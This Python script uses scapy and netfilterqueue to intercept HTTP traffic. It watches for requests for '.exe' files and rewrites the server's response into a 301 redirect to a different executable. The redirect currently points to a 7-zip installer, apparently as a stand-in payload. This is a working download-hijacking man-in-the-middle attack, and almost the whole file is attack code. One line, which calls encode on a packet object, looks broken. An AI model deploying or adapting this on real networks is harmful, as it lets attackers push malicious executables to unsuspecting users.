# Built-in imports
import sys; sys.path.append("/home/darkest/Dropbox/code/darkest/python")
import argparse

# Third-party imports
import scapy.all as scapy
import netfilterqueue

# Darkest APi imports
import darkest.Core as dac




class UserData():
  address: ...
  dnsip: ...
  listAck = []




def setLoad(packet, load):
  packet[scapy.Raw].load = load
  del packet[scapy.IP].len
  del packet[scapy.IP].chksum
  del packet[scapy.TCP].chksum
  return packet


def processPacket(packet):
  packetScapy = scapy.IP(packet.get_payload())
  if packetScapy.haslayer(scapy.Raw) and packetScapy.haslayer(scapy.TCP):  # We need to also check for the TCP layer to not run into index error
    if packetScapy[scapy.TCP].dport == 80:  # Rquest
      if ".exe" in packetScapy[scapy.Raw].load.decode("utf-8", "replace"):
        print("[+] '.exe' Request")
        userData.listAck.append(packetScapy[scapy.TCP].ack)

    elif packetScapy[scapy.TCP].sport == 80:  # Response
      if packetScapy[scapy.TCP].seq in userData.listAck:
        userData.listAck.remove(packetScapy[scapy.TCP].seq)
        print("[+] Replacing file")
        packetModified = setLoad(
          packetScapy, 
          "HTTP/1.1 301 Moved Permanently\nLocation: https://7-zip.org/a/7z2401-x64.exe"
        )
        packet.set_payload(packetModified.encode())

  packet.accept()




def syntaxCreator():
  """Creates the command's syntax object and returns it.
  """
  parser = argparse.ArgumentParser()
  parser.add_argument("-q", "--queue", default=0, type=int, help="Queue number, default is 0.")
  parser.add_argument("-a", "--address", default="http://cygwin.org/", type=str, help="Target web page address.")
  parser.add_argument("-i", "--ip", default="192.168.8.152", type=str, help="Spoof dns server address.")
  return parser.parse_args()


if __name__ == "__main__":
  args = syntaxCreator()

  # dac.Net.flushIpTables()

  userData = UserData()
  # Could be done in the constructor directly but lets keep it as class variables 
  userData.address = args.address
  userData.dnsip = args.ip
  queueIndx = dac.Net.createIpTables("local")
  try:
    dac.Net.bindIpTables(queueIndx, processPacket)
  except KeyboardInterrupt:
    print("\n[+] Flushing ip tables, please wait.\n")
    dac.Net.flushIpTables()

